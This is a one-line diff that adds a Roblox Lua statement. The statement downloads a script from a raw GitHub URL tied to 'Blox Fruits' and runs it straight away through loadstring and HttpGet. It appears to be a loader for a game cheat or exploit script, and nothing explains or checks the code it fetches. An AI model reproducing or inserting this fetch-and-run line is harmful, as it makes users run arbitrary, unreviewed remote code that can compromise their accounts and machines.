@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/blox-fruits-spam5-46kt8z9ionwa0j.lua"))()
